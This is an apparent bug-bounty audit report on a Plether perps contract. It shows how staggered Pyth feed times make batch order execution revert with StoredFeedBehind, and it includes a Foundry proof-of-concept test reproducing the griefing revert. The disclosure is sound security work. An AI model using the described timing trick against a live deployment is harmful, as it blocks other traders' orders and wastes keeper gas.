# \#99635 [SC-Medium] Valid order batches revert when Pyth components publish at different seconds

**Submitted on Nov 14th 2026 at 15:18:04 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99635
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
An unprivileged trader can place a valid order behind Alice’s FIFO head and cause the public batch execution path to reject both orders when the six signed Pyth feeds publish their first eligible updates at different seconds. The Oracle accepts that staggered basket for Alice’s order, but its reuse path then demands that every stored feed reach the basket’s newest component time. The earlier feed cannot satisfy that demand, so `StoredFeedBehind` reverts the entire batch. This failure uses ordinary signed price data and a Router-produced cache. Mallory controls her order and its timing; staggered feed publication within the permitted window is the necessary external condition.

## Vulnerability Details
Plether prices a delayed order from the first eligible post-commit Pyth update for each basket component. During `executeOrderBatch`, the Router keeps the first successfully resolved basket in memory and offers it to a later order if both commits precede every component in that basket. Reuse should preserve the same per-feed coverage rule that allowed the first resolution.

In the public-path PoC, Alice commits at `t` and Mallory commits at `t+1`. One signed feed publishes at `t+2`; the other five publish at `t+4`. Both ticks are after both commits and inside the 15-second settlement window. Their two-second separation is within the configured five-second component-divergence limit. At `t+6`, the first batch item resolves Alice’s order with `parsePriceFeedUpdatesUnique`. `PletherOracle._resolveHistoricalOrderBasket` then calls `pyth.updatePriceFeeds` and checks each stored feed against **that feed’s own parsed `publishTime`** (`packages/perps/src/PletherOracle.sol:617-626`). This passes: the earlier feed is stored at `t+2`, and the others at `t+4`. The returned cache records the basket’s newest time, `t+4`.

The Router’s timing predicate accepts that cache for Mallory’s order and forwards zero additional Pyth fee. In `updateBatchOrderExecutionPrice`, however, the Oracle checks **every** stored feed against `cache.publishTime`, or `t+4` (`PletherOracle.sol:262-266`). The earlier feed is valid at `t+2` but fails this stronger, unintended requirement. `OrderRouterExecutionSidecar._prepareBatchOracle` propagates the resulting `StoredFeedBehind` revert (`packages/perps/src/OrderRouterExecutionSidecar.sol:995-1029`). The whole transaction unwinds, including Alice’s valid execution and the first item’s Pyth storage updates. The cache was produced by the Router’s first item; no fabricated cache or invalid signed report is required.

## Impact Details
The batch processes zero orders and the keeper pays gas for a reverted transaction. Alice’s valid order remains at the FIFO head, while Mallory’s also remains pending. That is a concrete interruption of the batch execution path for time-sensitive orders. Separate single-order calls with the same payload succeed, but they require a new execution attempt; if none arrives before a deadline, the affected orders can expire. The PoC proves the immediate rollback and recovery through singles, not a guaranteed expiry or loss of funds.


## Proof of Concept

## Proof of Concept
**Single file:** `packages/perps/test/poc/Oracle_BatchCacheCoverageRevert.t.sol`. From `packages/perps` at the competition revision, run:

```sh
forge test --match-path 'test/poc/Oracle_BatchCacheCoverageRevert.t.sol' --offline --out out-oracle-verify-batch --cache-path cache-oracle-verify-batch -vv
```

The attack test asserts `StoredFeedBehind`, an unchanged FIFO head, both orders still pending, and no Alice position after the failed batch. It then executes both orders individually using the same payload. The second test supplies equal component times and confirms that batch reuse succeeds. The verified run passed **2/2 tests**. The test uses the repository’s MockPyth, which models the documented per-feed Pyth storage updates; no in-scope contract is modified.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {OracleSynchronizationTestBase} from "../perps/shared/OracleSynchronizationTestBase.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Batch cache reuse checks every stored feed against the NEWEST component time, while a fresh
///         historical resolution checks each feed against its own parsed time. With honest unequal component
///         times and a payload carrying only the commit-window ticks, the Router decides to reuse (time rules
///         pass, fee 0) and the Oracle reverts StoredFeedBehind, which the batch re-throws, reverting the
///         whole batch including the first, already-valid execution. The same orders execute fine one by one.
contract Oracle_BatchCacheCoverageRevert is OracleSynchronizationTestBase {

    function test_BatchRevertsOnHonestUnequalComponentTimesButSingleExecutionsSucceed() public {
        uint64 firstCommit = uint64(block.timestamp);
        uint64 aliceId = _commit(ALICE, 0);
        _advance(firstCommit + 1);
        uint64 bobId = _commit(BOB, 0); // later order, commit strictly before the oldest component
        _advance(firstCommit + 6);

        // First post-commit ticks: feed0 publishes at +2, feeds1..5 publish at +4 (2s apart, < 5s divergence).
        bytes[] memory historical = _payload(firstCommit + 4, firstCommit);
        MockPyth.FeedUpdate[] memory updates = abi.decode(historical[0], (MockPyth.FeedUpdate[]));
        updates[0].price.publishTime = firstCommit + 2;
        historical[0] = abi.encode(updates);

        uint256 keeperBefore = address(this).balance;
        // Funding for two independent resolutions is supplied; reuse would need none.
        vm.expectRevert(
            abi.encodeWithSelector(
                IPletherOracle.PletherOracle__StoredFeedBehind.selector,
                updates[0].id,
                uint256(firstCommit + 2),
                uint256(firstCommit + 4)
            )
        );
        router.executeOrderBatch{value: 4 * FEE}(bobId, historical);

        // Nothing progressed: both orders still pending, Alice's valid fill rolled back.
        assertEq(router.nextExecuteId(), aliceId, "batch made no progress");
        assertEq(uint256(router.lifecycleBook().lifecycleStatus(aliceId)), uint256(OrderV3Types.LifecycleStatus.Pending));
        assertEq(uint256(router.lifecycleBook().lifecycleStatus(bobId)), uint256(OrderV3Types.LifecycleStatus.Pending));
        (uint256 aliceSize,,,,,,) = engine.positions(ALICE);
        assertEq(aliceSize, 0);
        assertEq(address(this).balance, keeperBefore, "reverted call returns ETH; only gas is lost");

        // The identical payload executes both orders when submitted one at a time (fresh per-feed coverage).
        OrderV3Types.ExecutionResult memory r1 = router.executeOrder{value: 2 * FEE}(aliceId, historical);
        assertEq(uint256(r1.status), uint256(OrderV3Types.LifecycleStatus.Executed));
        OrderV3Types.ExecutionResult memory r2 = router.executeOrder{value: 2 * FEE}(bobId, historical);
        assertEq(uint256(r2.status), uint256(OrderV3Types.LifecycleStatus.Executed));
    }

    /// @notice Control: with equal component times the same two-order batch succeeds via reuse.
    function test_ControlEqualComponentTimesBatchSucceeds() public {
        uint64 firstCommit = uint64(block.timestamp);
        _commit(ALICE, 0);
        _advance(firstCommit + 1);
        uint64 bobId = _commit(BOB, 0);
        _advance(firstCommit + 6);
        bytes[] memory historical = _payload(firstCommit + 4, firstCommit);
        OrderV3Types.BatchResult memory result = router.executeOrderBatch{value: 4 * FEE}(bobId, historical);
        assertEq(result.terminalCount, 2);
        assertEq(baseMockPyth.parseUniqueCallCount(), 1);
    }

}
```
